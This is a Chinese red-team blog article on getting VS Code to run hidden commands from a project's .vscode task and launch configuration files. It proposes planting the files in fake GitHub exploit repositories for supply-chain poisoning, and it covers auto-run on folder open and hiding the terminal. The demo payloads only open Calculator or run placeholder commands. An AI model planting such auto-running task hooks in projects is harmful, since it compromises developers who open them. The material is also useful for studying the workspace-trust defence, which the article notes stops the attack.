<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GwFE9bnyMj1evMqhaXtgrg)

免责声明




==========

本公众号致力于安全研究和红队攻防技术分享等内容，本文中所有涉及的内容均不针对任何厂商或个人，同时由于传播、利用本公众号所发布的技术或工具造成的任何直接或者间接的后果及损失，均由使用者本人承担。请遵守中华人民共和国相关法律法规，切勿利用本公众号发布的技术或工具从事违法犯罪活动。最后，文中提及的图文若无意间导致了侵权问题，请在公众号后台私信联系作者，进行删除操作。

**0x0****0**

  

**先上才艺**

[视频详情](javascript:;)

**0x0****1**

  

**前言**

笔者参与了几次 hvv 后发现，蓝队已经不像以前一样是一群待宰的羔羊了，蓝队的技术水平也不再是只是看看 WAF、态势感知等平台的告警日志了，蓝队从主要是发现、处置和溯源事件，成长为拥有反制或反套路，甚至反钓鱼的能力。本文介绍的是一种利用 visual studio 钓鱼的方法，该方法适用场景非常广泛，例如供应链投毒、蓝队反钓鱼红队、水坑攻击等等。

**0x0****2**

  

**环境**

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stS0y902n5exib90Gvh9oHwAKJyH6JdrJd0iaflrkx6pMoDvAFV5aQownicg/640?wx_fmt=png)

**0x0****3**

  

**one-click local code execution**

   

----

以一个正常的 golang 项目举例，首先创建一个输出 test 的 go 文件

```
package main            
import "fmt"            
func main() {            
    fmt.Println("test")            
}

```

点击运行调试，正常输出

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSvu7vddNv6tCW5HWfGRI8bjKCk0kn2Q5BkhqbFhohQpricfnic0FjIFGQ/640?wx_fmt=png)

那么如果我们需要利用 go 编译可执行文件呢？

比如我们可以通过命令行 go build -o main main.go，那么可以在 visual code 通过点击运行调试实现一键生成吗？答案是有的

在调试界面创建 launch.json 文件，生成的文件会在项目目录 /.vscode/launch.json，然后将以下代码写入

```
{            
  "version": "0.2.0",            
  "configurations": [            
    {            
      "name": "Build Go",            
      "type": "go",            
      "request": "launch",            
      "mode": "exec",            
      "program": "/usr/local/go/bin/go",            
      "args": ["build", "-o", "${workspaceFolder}/main", "${workspaceFolder}/main.go"]            
    }            
  ]            
}

```

此处 program 指定的是二进制 go 文件的位置，可以通过以下方法查找（笔者为 mac）

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSn8dRSsqyEMEKnBUjrnJwOqicQ1xMDTdpYCxzXBrtVqj2GJd42ecAFlw/640?wx_fmt=png)

再次点击运行调试，可以发现生成了可执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stS1RXwNNYZ9NK1vLOA5QIib0xp2oTYzcgA0XcmySWTGaxORlHCtClRaLg/640?wx_fmt=png)

那么在这里我们可以看到这里 program 可以通过指定本地程序，然后通过参数化调用，那么我们是否可以通过指定其他程序来命令执行呢？

答案是不行的，launch.json 只是用于定义启动调试器的方式，无法运行命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSMoia2maicOu8FSmblZxOXibQBRPos7YxACUiaTTVjQsd3FFEUHDveQQcQw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSyiaEEtE6jvTibthvZyjDMiaCrbyLRWCdQkTjSVsrqKPibr8mTdyAial4rrg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSqZe2GM7OZlznSBb2NaMIsVKp6DvTQic8fsk0PmPLaOGQ6uuHeEhw9vQ/640?wx_fmt=png)

那么我们是否有其他办法执行系统命令呢？答案是有的，可以通过运行任务的方式执行命令。

通过 [终端] 可以生成任务

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stS9Tzyh2yEZzNNBjdB92q5gKImjVaxF6fkCtGxAcEDbmEJsRJricdEzuA/640?wx_fmt=png)

或者直接在. vscode 下创建 tasks.json，然后将以下代码写入

```
{            
    "version": "2.0.0",            
    "tasks": [            
      {            
        "type": "shell",            
        "label": "cmd-demo",            
        "command": "open",            
        "args": [            
            "-a",            
            "/System/Applications/Calculator.app"            
        ],            
        "group": {            
          "kind": "build",            
          "isDefault": true            
        }            
      }            
    ]            
}

```

然后回到 launch.json 中，添加 "preLaunchTask": "cmd-demo"，其中 preLaunchTask 的值必须与 tasks.json 中的 label 值相同，意思就是在运行编译之前先运行任务

点击运行调试，弹出计算器，而且也生成了可执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSZU9IqN9NDkwiaz5AmbxqUtViaw21RG1XJlbWUKEIRJHlYlEnGibC46icGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSAvk73ASKbALgrpbg9zibArSFuS9tsKyiaYtOYFthlWxMx3KDmL7cO1Mw/640?wx_fmt=png)

**0x0****4**

  

**供应链投毒**

简单举个例子，比如在 github 或开源社区通过公布漏洞 EXP 等的方式，上传该代码，提示用户需要自行编译，引导其在 Visual Studio Code 中自动编译。
--------------------------------------------------------------------------------------

那么不同的用户可能使用的系统不同（windows/mac/linux），那么如果只是用于攻击，就无需管 launch.json 中的 program 的值，可以让用户自己指定，我们只需要处理 tasks.json 中的内容，这里比如指定个不存在的路径

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSK5jXRsZw9IwIHKpibMhzGNdTcnOa7tXMpfDRshhMHFtkEsT5yfcTrQQ/640?wx_fmt=png)

依旧弹出了计算器，意味着无论 launch.json 中的 program 是否可以执行，也会先运行 tasks.json 中的任务

但是由于不同的系统，远程控制的方式不同，比如 windows 的通过加载 shellcode 进行远程控制，而 linux 通过 bash 来进行反弹 shell，那么提供几种思路

##### **1、任务自带参数判断** 

tasks.json 中自带参数可以判断当前操作系统，如：windows、linux 和 osx，其中 osx 就是 macOS

```
{            
    "version": "2.0.0",            
    "tasks": [            
      {            
        "label": "cmd-demo",            
        "type": "process",            
        "osx": {            
          "command": "open",            
          "args": [            
            "-a",            
            "/System/Applications/Calculator.app"            
          ]            
        },            
        "linux": {            
          "command": ""            
        },            
        "windows": {            
          "command": ""            
        },            
      }            
    ]            
}

```

运行方式还是在 launch.json 中指定 preLaunchTask，优先运行该任务

##### **2、暴力同时执行多个任务** 

在. vscode 目录下新建一个 preLaunchScript.js，然后将以下代码写入

```
const { exec } = require('child_process');            
// 第一个要执行的命令            
exec('a', (error, stdout, stderr) => {            
  if (error) {            
    console.error(`Error running task1: ${error.message}`);            
    // 在这里进行错误处理逻辑            
  }            
  console.log(stdout);            
  // 第二个要执行的命令            
  exec('b', (error, stdout, stderr) => {            
    if (error) {            
      console.error(`Error running task2: ${error.message}`);            
      // 在这里进行错误处理逻辑            
    }            
    console.log(stdout);            
  });            
});

```

然后在 tasks.json 中运行这个 JS

```
{            
    "version": "2.0.0",            
    "tasks": [            
      {            
        "type": "shell",            
        "label": "cmd-demo",            
"command" : "node ${workspaceFolder}/.vscode/preLaunchScript.js"            
      }            
    ]            
} 

```

最后也是跟上面一样在 launch.json 中指定 preLaunchTask 优先运行这个任务

**0x0****5**

  

**zero-click local code execution**  

那么有没有一种办法可以实现项目引入工作区就自动运行任务呢？答案是有的

在 tasks.json 可以配置 runOptions 用于任务的自动运行条件：

*   "runOn": "onSave" 在保存文件时运行任务。
    
*   "runOn": "onType" 在键入时运行任务。每当你在编辑器中键入字符时，任务将自动运行。
    
*   "runOn": "onFolderChange" 在当前打开的文件夹中的任何文件更改时运行任务。如果你有多个文件在同一个文件夹中，任何文件的更改都会触发任务运行。
    
*   "runOn": "onRootChange" 在当前工作区根目录下的任何文件更改时运行任务。这包括当前文件夹及其子文件夹中的文件更改。
    
*   "runOn": "onAnyChange" 在任何文件更改时运行任务。无论在当前工作区中的哪个文件夹中进行的更改，都会触发任务运行。
    

这里选择 "runOn": "onFolderChange"，即当这个文件夹导入工作区时，就直接运行任务

但是此时当运行任务的时候发现终端会弹一个新窗口出来提示正在运行任务

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSD61ucDGJ4icSmTKnvCibpY3Jnf2F2FYyFh1Z6r8kQ0icPnicC5FM0IicoDA/640?wx_fmt=png)

当然这也是可以隐藏的，设置 tasks.json 加一个新参数 "presentation": {"reveal": "silent"}，达成效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSLCtxKCjCY0nBJDDMx2KWMhsunZXr1r29OfY4tKwm5FlzicWmhmxnPzw/640?wx_fmt=png)

**0x06**

  

**无条件本地代码执行？**

显然不是，当项目导入工作区的时候，会有一个弹框 “是否信任此文件夹中的文件的作者？” 本地测试发现当我们点击否即可阻止项目中的任务运行

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybFqabOtialibbpXnn09vv9stSd7tHZhMSK5deGWJ86nCFF33AoFSU9WnJMc7DL0rjXd36EMEgYrGzAQ/640?wx_fmt=png)